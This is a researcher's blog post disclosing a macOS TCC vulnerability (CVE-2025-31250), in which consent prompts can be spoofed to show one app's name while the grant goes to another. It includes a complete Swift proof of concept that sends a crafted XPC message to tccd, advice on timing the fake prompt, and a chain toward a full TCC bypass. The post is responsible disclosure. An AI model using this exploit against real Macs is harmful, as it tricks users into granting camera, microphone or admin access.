<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://wts.dev/posts/tcc-who/">Original</a>
    <h1>Can you trust that permission pop-up on macOS?</h1>
    
    <div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting">
    <header>
      
      
      <img alt="A dialog box that reads &#39;System Settings would like to administer your computer. Administration can include modifying passwords, networking, and system settings.&#39;" src="https://wts.dev/posts/tcc-who/consent-prompt.png" height="700"/>
    </header>
    <h2>Important Correction</h2>
    <p>A previous version of this article mentioned below that this CVE was patched in <q>macOS Sequoia 15.5 et al.</q>, but I was a bit mistaken in that. Despite being released today as well, it appears that macOS Ventura 13.7.6 and macOS Sonoma 14.7.6 are <strong><em>not</em></strong> patched against this vulnerability.</p>
    <p>I wrote the original sentence assuming that Apple would have included a patch in all of the releases. It was only later, when I checked <a href="https://support.apple.com/en-us/100100">the security release notes</a>, that I saw I was not credited under the other two releases. I reached out to Apple to clarify if these releases were patched. As of writing, I have not heard back.</p>
    <p>I chose to do my own testing and spun up a virtual machine. After some difficulties I got it updated to macOS Sonoma 14.7.6 and was able to compile and run my proof of concept. It still worked. I would assume the same is true for macOS Ventura 13.7.6. I&#39;m not sure why Apple didn&#39;t include the patch in these two releases.</p>
    <p>I will update this post when I have more information and/or context.</p>
    <h2>Introduction</h2>
    <p>It&#39;s time to update your Macs again! This time, I&#39;m not burying the lede. <b>CVE-2025-31250</b>, which was patched in today&#39;s release of macOS Sequoia 15.5, allowed for…</p>
    <ol>
      <li>…any <b>Application A</b> to make macOS show a permission consent prompt…</li>
      <li>…appearing as if it were coming from any <b>Application B</b>…</li>
      <li>…with the results of the user&#39;s consent response being applied to any <b>Application C.</b></li>
    </ol>
    <p>These did not have to be different applications. In fact, in most normal uses, they would all likely be the same application. Even a case where Applications B and C were the same but different than Application A would be relatively safe (if somewhat useless from Application A&#39;s perspective). However, prior to this vulnerability being patched, a lack of validation allowed for Application B (the app the prompt <em>appears</em> to be from) to be different than Application C (the <em>actual</em> application the user&#39;s consent response is applied to).</p>
    <p>Spoofing these kinds of prompts is not exactly new. In fact, <a href="https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/index.html#tcc-request-by-arbitrary-name">the HackTricks wiki has had a tutorial on how to perform a similar trick on their site for a while.</a> However, their method requires:</p>
    <ol>
      <li>the building of an entire fake app in a temporary directory,</li>
      <li>the overriding of a shortcut on the Dock, and</li>
      <li>the simple hoping that the user clicks on the (now) fake shortcut.</li>
    </ol>
    <p>This vulnerability requires <strong><em>none of the above.</em></strong></p>
    <h2>TCC</h2>
    <p>As I explained in <a href="https://wts.dev/posts/tcc-sql-injection/#TCC">my first ever article on this site,</a> TCC is the core permissions system built into Apple&#39;s operating systems. It is used by sending messages to the <code>tccd</code> daemon (or rather, by using functions in the private <code>TCC</code> framework). The framework is a private API, so developers don&#39;t call the functions directly (instead, public API&#39;s call the functions under-the-hood as needed). However, all this wrapping cannot hide the fact that the control mechanism is still simply sending messages to the daemon.</p>
    <p>The daemon uses Apple&#39;s public (but proprietary) <a href="https://developer.apple.com/documentation/xpc">XPC API</a> for messaging (specifically the lower-level dictionary-based API). Prior to this vulnerability being patched, any app with the ability to send XPC messages to <code>tccd</code> could send it a specifically-crafted message that, as described above, would make it display a permission prompt as if it were from one app but then apply the user&#39;s response to a completely separate app. But how was this possible, and was it even hard? Before I answer these questions, we need to detour into what will, at first, seem like a completely unrelated topic.</p>
    <h2>Apple Events</h2>
    <h3>What are Apple Events?</h3>
    <p><b>Apple Events</b> are a method of inter-process communication on macOS. As of writing, if you <a href="https://www.google.com/search?&amp;q=site:developer.apple.com+%22apple+events%22&amp;udm=14">search <code>site:developer.apple.com &#34;apple events&#34;</code> on Google,</a> one of the very first results will likely be <a href="https://developer.apple.com/library/archive/documentation/mac/pdf/Interapplication_Communication/Intro_to_Apple_Events.pdf">this PDF document titled <cite>Introduction to Apple Events</cite>.</a> Skimming through this PDF, you could be forgiven for thinking the contents are at all relevant to modern-day programming. You might find it strange that it starts at Chapter 3, but you may then <a href="https://www.google.com/search?q=inurl:https://developer.apple.com/library/archive/documentation/mac/pdf/Interapplication_Communication&amp;udm=14">search and find the other PDFs that comprise the book.</a></p>
    <p>Looking closer at the book, you might start to get confused at some of the code snippets. It&#39;s not until looking closer that you realize… <a href="https://developer.apple.com/library/archive/documentation/mac/pdf/Interapplication_Communication/Scripting_Components.pdf">some of this code is Pascal.</a> You may then hurriedly search the name of the book and find <a href="https://www.amazon.com/Inside-Macintosh-Interapplication-Communication-Technical/dp/0201622009">an Amazon listing</a> that includes the publication date: <time datetime="1993-01-01">January 1, 1993</time>. This is an old book. It predates Mac OS X, and is actually from the era prior (now retroactively known as <a href="https://en.wikipedia.org/wiki/Classic_Mac_OS">Classic Mac OS</a>). So wait, if this protocol is that old, why am I talking about it now, in 2025, in the context of modern macOS?</p>
    <p>The situation I described above happened to me as I was searching for resources on Apple Events. I was looking into the protocol because really… Apple Events are <em>still</em> part of macOS. While the new kernel introduced with Mac OS X required the technology to be re-architected, the concept and general use still exists to this day.</p>
    <p>The most common use-case for Apple events today is automation (telling a app to perform a specific action or set of actions). This can be scripted through the use of Apple&#39;s <a href="https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/HowMacScriptingWorks.html">Open Scripting Architecture.</a> The primary language used for these scripts is <a href="https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html">AppleScript,</a> but <a href="https://en.wikipedia.org/wiki/JavaScript_OSA">JavaScript can also be used.</a> This is similar to the <a href="https://en.wikipedia.org/wiki/Windows_Script_Host">Windows Script Host</a> on Windows. And, like on Windows, <a href="https://www.youtube.com/watch?v=Nlnuk8W2A0Y">this scripting has been used as a vector for malware.</a></p>
    <h3>Apple Events and TCC</h3>
    <p>So what does this have to do with TCC? Well, <a href="https://developer.apple.com/videos/play/wwdc2019/701/?time=2195">as of macOS Mojave 10.14, the sending of Apple Events by an app requires specific user consent via TCC.</a> However, attempting to add Apple Events to TCC likely posed a challenge to Apple. Note that some of the following is speculation and I don&#39;t want to have to dig up old versions of TCC to validate my theories. However, I do believe they are likely fairly accurate.</p>
    <p>As I explained in my previous article, TCC stores user consent results in an SQLite database file located at <code>[User Home  Folder]/Application Support/com.apple.TCC/TCC.db</code>. While it might seem strange to have such sensitive data stored out in the open, this file (and the directory containing it) are generally well-protected. However, this setup <em>has</em> been exploited multiple times in the past. You might already see the potential flaw. Let&#39;s put a pin in that and we&#39;ll come back to it later on in the article.</p>
    <p>Back to the database: among other columns, each row of <code>TCC.db</code> has</p>
    <ol>
      <li>a column for the app requesting a permission (or rather <q>service</q>, as TCC would call it),</li>
      <li>a column for the service the app requested, and</li>
      <li>a column for the user&#39;s consent response.</li>
    </ol>
    <p>This model works great when there is a single resource behind a service. However, with Apple Events, the resource could be any receiving app. Apple&#39;s engineers <em>could</em> have simply added an <q>Apple Events</q> service which, when permission is granted to an application, would allow it to send Apple Events to <em>any</em> app. However, this would still leave the door open for abuse. Instead Apple decided to limit user consent for the sending of Apple Events on a per-receiving-app basis. But how could they do this?</p>
    <p>Rows in <code>TCC.db</code> that denote user consent responses for Apple Events use a <em>fourth</em> column: the <q>indirect object</q> column. An identifier for the receiving app is placed in this column. While I have only ever seen it used with Apple Events, <a href="https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive">there is apparently one other service, <code>FileProviderDomain</code>, that uses it.</a> It&#39;s unclear to me if this column existed prior to the Mojave update, but I wouldn&#39;t be surprised if it was added <em>for</em> Apple Events, and the uses for other services came later. I could be wrong, but, again, I don&#39;t want to dig up old TCC releases to check. I&#39;ll leave that as an exercise for the reader.</p>
    <p>Anyway, as many consent interactions with TCC do not require the use of this column, the TCC daemon handles messages that do and don&#39;t require it (among the many other functions of the daemon) separately. This is done through the string value of the <code>function</code> key in the XPC dictionary messages sent to the daemon. Specifically, the <code>TCCAccessRequestIndirect</code> function of the daemon handles messages that need to use the <q>indirect object</q> column in the resulting row that would be appended to the database.</p>
    <p>The <code>TCCAccessRequestIndirect</code> function included a logic bug that resulted in the behavior I described at the start of this article: where a sender could specify one app which would be used to build and display the user consent prompt while also specifying another that would actually be inserted into the database as the one that requested the service. This bug did not exist in other access-request functions.</p>
    <h2>Proof-of-Concept</h2>
    <pre><code>class TCCPromptSpoofer {
      public enum Error: Swift.Error {
          case actualBundleHasNoIdentifier
          case spoofedBundleHasNoExecutablePath
  
          case failedToCreateSecStaticCode(OSStatus)
          case failedToCopySigningInformation(OSStatus)
          case failedToGetRequirementData(OSStatus)
  
          case requirementsDataHasNoBaseAddress
      }
      /// Spoof a TCC prompt.
      /// - Parameters:
      ///   - spoofedBundle: The bundle that will be shown in the prompt.
      ///   - actualBundle: The bundle that will actually receive the permissions.
      ///   - service: The service to spoof.
      ///   - indirectObject: The indirect object to spoof (mainly used for the AppleEvents service).
      ///   - useCSReq: Wether to send the code signature requirements to the TCC daemon.
      /// - Returns: Whether the user accepted the prompt.
      @discardableResult
      public static func spoofPrompt(
          spoofedBundle: Bundle,
          actualBundle: Bundle,
          service: String,
          indirectObject: String? = nil,
          useCSReq: Bool = false
      ) throws -&gt; Bool {
          // We need an actual bundle with an identifier for this to work.
          guard let actualBundleID = actualBundle.bundleIdentifier else {
              throw self.Error.actualBundleHasNoIdentifier
          }
          // We also need a spoofed bundle with an executable path for this to work.
          guard let spoofedExecutablePath = spoofedBundle.executablePath else {
              throw self.Error.spoofedBundleHasNoExecutablePath
          }
  
          // We need to create an XPC dictionary to send to the TCC daemon.
          let xpcDict = xpc_dictionary_create(nil, nil, 0)
          xpc_dictionary_set_string(xpcDict, &#34;function&#34;, &#34;TCCAccessRequestIndirect&#34;)
          xpc_dictionary_set_string(xpcDict, &#34;service&#34;, &#34;kTCCService\(service)&#34;)
          // A `target_prompt` value of 2 is the only one without special handling in the TCC daemon, so we use that.
          xpc_dictionary_set_int64(xpcDict, &#34;target_prompt&#34;, 2)
  
          // &lt;key_part_of_exploit&gt;
  
          // This is the value that will end up being put into the database, giving the actual bundle the permissions.
          xpc_dictionary_set_string(xpcDict, &#34;target_identifier&#34;, actualBundleID)
          xpc_dictionary_set_int64(xpcDict, &#34;target_identifier_type&#34;, 0)  // A type of 0 means a bundle identifier.
  
          // This is the value that will be used to get the display name of the requesting app for use in the prompt.
          xpc_dictionary_set_string(xpcDict, &#34;target_path&#34;, spoofedExecutablePath)
  
          // &lt;/key_part_of_exploit&gt;
  
          // We make the requirements blob here.
          let requirementsBlob =
              useCSReq
              // We need to get the code signature requirements data of the actual bundle.
              ? try {
                  // Make a static code object from the actual bundle.
                  var staticCode: SecStaticCode?
                  let staticCodeCreateStatus = SecStaticCodeCreateWithPath(
                      actualBundle.bundleURL as CFURL, [], &amp;staticCode
                  )
                  guard
                      staticCodeCreateStatus == errSecSuccess,
                      let secStaticCode = staticCode
                  else {
                      throw self.Error
                          .failedToCreateSecStaticCode(staticCodeCreateStatus)
                  }
  
                  // Get the signing information of the actual bundle.
                  var information: CFDictionary?
                  let copySigningInformationStatus = SecCodeCopySigningInformation(
                      secStaticCode, .init(rawValue: kSecCSRequirementInformation), &amp;information
                  )
                  guard
                      copySigningInformationStatus == errSecSuccess,
                      let signingInformation = information as? [String: Any]
                  else {
                      throw self.Error
                          .failedToCopySigningInformation(copySigningInformationStatus)
                  }
  
                  // Get the code signature requirements data of the actual bundle.
                  guard
                      let requirementsData = signingInformation[kSecCodeInfoRequirementData as String]
                          as? Data
                  else {
                      throw self.Error
                          .failedToGetRequirementData(copySigningInformationStatus)
                  }
                  return requirementsData
              }()
              // We still need to send *something* as the requirements blob, so fallback to an empty Data object.
              : Data()
  
          // Now we put the requirements blob from above into the XPC dictionary.
          try requirementsBlob.withUnsafeBytes { bufferPointer in
              // This should probably never happen, but it&#39;s better to be safe than sorry.
              guard let baseAddress = bufferPointer.baseAddress else {
                  throw self.Error.requirementsDataHasNoBaseAddress
              }
              // We copy the buffer to a new pointer as, per the documentation, the buffer pointer is only valid
              // within the block. This new pointer, while it is defined within the block, should not be subject
              // to the same restrictions (hopefully), so it should be safe to put into the XPC dictionary.
              let newPointer = UnsafeMutablePointer&lt;UInt8&gt;.allocate(capacity: bufferPointer.count)
              newPointer.initialize(
                  from: baseAddress.bindMemory(to: UInt8.self, capacity: bufferPointer.count),
                  count: bufferPointer.count
              )
              xpc_dictionary_set_data(
                  xpcDict, &#34;target_csreq&#34;,
                  newPointer, bufferPointer.count
              )
          }
  
          // This key is required by the function, so we either pass in a user-provided value or an empty string.
          xpc_dictionary_set_string(xpcDict, &#34;indirect_object_identifier&#34;, indirectObject ?? &#34;&#34;)
  
          // A `target_prompt` value of 2 is the only one without special handling in the TCC daemon, so we use that.
          xpc_dictionary_set_int64(xpcDict, &#34;target_prompt&#34;, 2)
  
          // Finally, we send the XPC dictionary to the TCC daemon.
          let connection = xpc_connection_create_mach_service(&#34;com.apple.tccd&#34;, nil, 0)
          xpc_connection_set_event_handler(connection) { _ in }
          xpc_connection_resume(connection)
          let reply = xpc_connection_send_message_with_reply_sync(connection, xpcDict)
          let didAccept = xpc_dictionary_get_bool(reply, &#34;result&#34;)
          return didAccept
      }
  }</code></pre>
    <p>The above code may seem complicated, but really, not all of it is necessary or relevant. The logic bug itself was quite simple. Put simply, when sending an XPC dictionary message to <code>tccd</code> for the <code>TCCAccessRequestIndirect</code> function (and with a <code>target_prompt</code> of <code>2</code>)…</p>
    <ol>
      <li>…the name of the bundle at the path passed via the <code>target_path</code> key would be used for the GUI consent prompt…</li>
      <li>…while the bundle represented by the bundle ID passed via the <code>target_identifier</code> key would be the actual one inserted into the database.</li>
    </ol>
    <p>Additionally, despite this specifically being a function <em>for</em> access requests with indirect objects, you could just specify an empty string as the indirect object and use the function for several other TCC services that didn&#39;t use that column. As for why the TCC daemon has two different fields that can be specified separately when they (logically) should always refer to the same thing: I have no idea. And while this vulnerability would still require the user to respond in the affirmative, it ultimately opened up a way to spoof TCC prompts as if they were coming from any other app on the user&#39;s machine. That was obviously not ideal.</p>
    <h2>Exploiting this Vulnerability</h2>
    <h3>Limitations and Quirks</h3>
    <p>Another limitation of this vulnerability was that it could only be used with a specific set of TCC services. However, this included many of the major ones such as Microphone, Camera, and the like. Consent prompts for access to specific directories could also be spoofed, but additional layers of security around files made it not very useful (although, unrelated, <a href="https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/">Apple did recently patch a filesystem-based sandbox escape</a>).</p>
    <p>An interesting factor of this vulnerability is that a malicious app could use it and have the user&#39;s consent result ultimately apply to <em>another</em> app. While this might not seem useful at first, it might be helpful for sophisticated attacks wherein an attacker has found a way to control another app, but still needs that app to have user consent to a TCC service in order to actually utilize it to its full potential.</p>
    <h3>Timing The Exploit</h3>
    <p>Timing <em>when</em> to show a spoofed prompt is key when exploiting this vulnerability. If a TCC consent prompt were to <em>randomly</em> appear to a user, they would likely view it with suspicion and click <q>Don&#39;t Allow</q>. However, if one were to appear at the correct time, the user might end up clicking <q>Allow</q>.</p>
    <p>But when exactly is <q>the correct time</q>? I&#39;ll answer that question with a question: did you know that, on macOS, an app can often easily <a href="https://developer.apple.com/documentation/appkit/nsworkspace/runningapplications">view the list of running applications</a> and can even <a href="https://developer.apple.com/documentation/appkit/nsworkspace/frontmostapplication">see which one is currently on top?</a> All a malicious app would have to do is lie in wait for a specific app to launch and/or become the <q>frontmost</q> app, and only <em>then</em> show a spoofed prompt with the name of that app. As it would appear when the user opens or switches to the app, they might be tricked into thinking the prompt came from that app.</p>
    <p>For example, an attacker could wait for the user to open FaceTime before showing a spoofed consent prompt for Camera permissions (hoping that the user doesn&#39;t see the FaceTime window already using their camera underneath the prompt). A potentially more fruitful path would be to wait until the user opens Voice Memos and then spoof a prompt for Microphone access. There are several other hypothetical scenarios, but those are two that come to mind. There is one more, though, that could chain into a complete TCC bypass.</p>
    <h3>Revisiting An Old Exploit</h3>
    <p>The astute among you might have wondered earlier: <q>if the location of the <code>TCC.db</code> database is dependent on the user&#39;s home folder, how is that determined?</q>. The answer to your question depends on <em>when</em> you&#39;re asking. Prior to updates released in mid-July of 2020, <a href="https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8">the <code>tccd</code> daemon simply used the <code>HOME</code> environment variable</a> This vulnerability (<a href="http://x.com/mattshockl/status/1480612268857507841">retroactively named $HOMERun by the researcher</a>), opened up a trivial TCC bypass that was as simple as planting a fake <code>TCC.db</code> in the correct path off of a fake home folder and then setting the value of the <code>HOME</code> environment variable to that fake home folder.</p>
    <p>After the above was patched, the TCC daemon now queries the operating system&#39;s user info directory for the user&#39;s home folder. This is the proper way it should be done, as it is much more resistant to exploits. But it is not completely resistant. <a href="https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/">Wojciech Reguła, who I mentioned in one of my previous write-ups, found a way to abuse the plugin system of the GUI user info directory editor built into macOS,</a> while <a href="https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/">the Microsoft Threat Intelligence team found a bypass they called <q>powerdir</q> using built-in import and export commands.</a></p>
    <p>There are two things an app generally needs to change the user&#39;s home folder. The first is root access. Neither of the above were able to bypass this requirement, and neither was this vulnerability able to do so. However, both of the above were able to bypass the second requirement: user consent to a specific TCC service. While this vulnerability cannot <em>completely</em> bypass this requirement, it <em>can</em> be used to present the user with a spoofed consent prompt for that specific TCC service, hoping that they click <q>Allow</q>.</p>
    <img alt="A dialog box that reads &#39;System Settings would like to administer your computer. Administration can include modifying passwords, networking, and system settings.&#39;" src="https://wts.dev/posts/tcc-who/consent-prompt.png" height="700"/>
    <p>Consider the above prompt. Would you click <q>Allow</q>? If you&#39;ve read this far in the article your answer is probably <q>no</q>. But think about if you hadn&#39;t read this article. If this prompt appeared <em>when you opened the System Settings app</em>, would you click <q>Allow</q> then? Maybe something else would tip you off. Maybe you would wonder <q>shouldn&#39;t the System Settings app already have permission to do this?</q> Perhaps, if you were skeptical enough, you would still click <q>Don&#39;t Allow</q>. But I don&#39;t think that&#39;s what <em>everyone</em> would do.</p>
    <p>In this hypothetical example, if you were unfortunate enough to be tricked by the above prompt and click <q>Allow</q> you would be giving some unknown app half of what it needs to ultimately change your home folder, plant a fake <code>TCC.db</code>, and bypass the real database. Those who read <a href="https://wts.dev/posts/tcc-sql-injection/">my first article</a> might wonder about <code>REG.db</code>, the database that keeps track of all valid <code>TCC.db</code> databases. Well, unfortunately, TCC provides a function for any app to simply add an entry to <code>REG.db</code>. Thus, even if it would have stood in the way of this exploit, it can be effectively thwarted by simply adding an entry with the path to the planted <code>TCC.db</code>.</p>
    <p>After receiving the tricked consent above, all the malicious app would need to do is find a way to escalate to root and use that (and the above) to modify the user info directory and change the user&#39;s home folder.</p>
    <p>To be transparent, I did not automate this process. I leave that as an exercise for the reader, if they so desire. However, I did manually play around with changing my home folder (and adding entries to <code>REG.db</code>) and did observe TCC using both my real database and one I planted (behaving differently with each as their contents diverged). This makes sense, as operating from any home folder is a legitimate use case for TCC.</p>
    <p>Ultimately, changing the user&#39;s home folder and planting a fake <code>TCC.db</code> (while also potentially adding an entry for it in <code>REG.db</code>) will likely be a viable exploit path now and into the future. Attackers and security researchers will just have to find new ways of breaking their way into modifying the user info directory.</p>
    <h2>Timeline</h2>
    <p>Something interesting to note is this: despite this not being my second ever article, this <em>was</em> the second ever bug I reported to Apple. It&#39;s taken a <em>long</em> time for Apple to ultimately patch this. By far, of the bugs I have reported (and that Apple has patched) this one has taken the longest amount of time to be patched:</p>
    <table id="timeline">
      <thead>
        <tr>
          <th scope="col">Date</th>
          <th scope="row">Event</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td><time datetime="2024-05-02">2024-05-02</time></td>
          <td>I file the initial report with Apple Product Security (+ several additional clarifying messages)</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-03">2024-05-03</time></td>
          <td>Apple Product Security responds, asking for clarification (+ my response)</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-03">2024-05-03</time></td>
          <td>Later in the day, I discover the potential full TCC bypass and inform Apple Product Security</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-04">2024-05-04</time></td>
          <td>I leave several additional update messages as I continue testing my PoC</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-06">2024-05-06</time></td>
          <td>Apple Product Security thanks me for the information</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-15">2024-05-15</time></td>
          <td>I notice the status is shown as <q>reproduced</q>, so I follow-up, summarizing all of my previous ramblings</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-16">2024-05-16</time></td>
          <td>Apple Product Security thanks me and reminds me not to disclose the info during their investigation</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-30">2024-05-30</time></td>
          <td>I reach out again, asking for an update on the investigation and my report</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-30">2024-05-30</time></td>
          <td>Apple Product Security replies, saying they are still investigating, and reminds me again to not disclose</td>
        </tr>
        <tr>
          <td><time datetime="2024-06-28">2024-06-28</time></td>
          <td>I reach out again, asking for an update on the investigation and my report</td>
        </tr>
        <tr>
          <td><time datetime="2024-06-28">2024-06-28</time></td>
          <td>Apple Product Security replies, saying there is no update and that they are still investigating</td>
        </tr>
        <tr>
          <td><time datetime="2024-09-17">2024-09-17</time></td>
          <td>I reach out again, asking for an update, sharing what I believe could be a simple patch for the vulnerability: validating that the two fields refer to the same app</td>
        </tr>
        <tr>
          <td><time datetime="2024-09-17">2024-09-17</time></td>
          <td>Apple Product Security replies, saying they are still investigating</td>
        </tr>
        <tr>
          <td><time datetime="2024-12-09">2024-12-09</time></td>
          <td>I reach out again, asking for an update, reiterating my proposed simple patch</td>
        </tr>
        <tr>
          <td><time datetime="2024-12-09">2024-12-09</time></td>
          <td>Apple Product Security replies, saying they are still investigating and that they appreciate my patience</td>
        </tr>
        <tr>
          <td><time datetime="2025-02-28">2025-02-28</time></td>
          <td>I notice there is now an estimated timeframe for a patch, and comment appreciatively</td>
        </tr>
        <tr>
          <td><time datetime="2025-03-03">2025-03-03</time></td>
          <td>Apple Product Security replies thankfully</td>
        </tr>
        <tr>
          <td><time datetime="2025-05-02">2025-05-02</time></td>
          <td>Apple Product Security asks me what name I would like to be credited under</td>
        </tr>
        <tr>
          <td><time datetime="2025-05-02">2025-05-02</time></td>
          <td>I provide my response</td>
        </tr>
        <tr>
          <td><time datetime="2025-05-05">2025-05-05</time></td>
          <td>Apple confirms that I will be credited</td>
        </tr>
        <tr>
          <td><time datetime="2025-05-12">2025-05-12</time></td>
          <td>The patch is released</td>
        </tr>
      </tbody>
    </table>
    <h2>Conclusion</h2>
    <h3>Miscellaneous Additions</h3>
    <p>For those wondering, yes TCC is the system behind the <q>Privacy &amp; Security</q> pane (renamed from <q>Security &amp; Privacy</q>) in the System Settings app. More specifically, the Apple-Events-related consent results appear under the <q>Automation</q> section. The <q>Privacy &amp; Security</q> pane, as a whole, provides a GUI allowing for users to review the consent they have given and (often) allowing them to revoke specific consent responses.</p>
    <p>Something ironic that I found is that if an attacker was able to successfully trick a user into allowing it to send Apple Events, the consent result would not appear in System Settings. This would make it so the user would be unable to revoke their consent through the GUI. There is a (fairly undocumented) <abbr title="command line interface">CLI</abbr> tool called <code>tccutil</code> they could use to revoke their consent, but I doubt most users know about it. I&#39;ve only found it documented by Apple in two places: <a href="https://developer.apple.com/library/archive/qa/qa1906/_index.html">an old Technical Q&amp;A</a> and <a href="https://it-training.apple.com/tutorials/support/sup125/">an IT training page.</a></p>
    <p>On another note, <a href="https://objective-see.org/blog/blog_0x7F.html">Apple&#39;s Endpoint Security framework recently added support for monitoring modifications to the TCC database.</a> If it works as expected, an app using the framework could provide users with the ability to recognize spoofed prompts by, at the very least, notifying them immediately after the fact which app they <em>actually</em> just gave their consent to. That is, if it&#39;s being used in the small window between when Apple implemented these events in their Endpoint Security framework and when they patched this vulnerability.</p>
    <h3>Apple&#39;s Fix</h3>
    <p>So, what was Apple&#39;s fix? To be honest, I&#39;m not entirely sure. When writing this section originally, I downloaded the macOS Sequoia 15.5 RC update file, extracted the <code>tccd</code> binary from it, and performed some brief static analysis to determine what had changed. I came away with a theory of what it was doing at runtime, but I waited for the final release to confirm. It turns out that my original theory was wrong, and the patch Apple had made was quite a bit more complex. Looking closer, it appears they have addressed several issues with the original vulnerability. Not only can an app no longer spoof a TCC prompt in this way, the ability to simply specify an empty string for the indirect object appears similarly hampered.</p>
    <p>Ultimately, it appears these types of messages are now silently dropped by <code>tccd</code> and no action is taken. I&#39;ll probably end up looking through the patch more in order to fully understand it (and I wouldn&#39;t be surprised if others do as well), but from some brief probing I have done post-update it does seem to be a good patch. If it&#39;s not, I&#39;m sure you&#39;ll see another update from me or whoever else finds their way around it at some point in the future. If there is something Apple missed, hopefully it doesn&#39;t take them another year to patch it!</p>
    <h3>Final Thoughts</h3>
    <p>If there&#39;s anything I&#39;ve learned through security research, it&#39;s that if I want this vulnerability to pop I should give it a fancy name. I&#39;m not really creative person, so I&#39;ll just pick the first thing that comes to my head.</p>
    <p>I&#39;ll call this vulnerability: <q>TCC, Who?</q>.</p>
    <p>As always… <a target="_self" href="https://wts.dev/feed.xml">watch this space.</a></p>
  </article></div>
  </body>
</html>
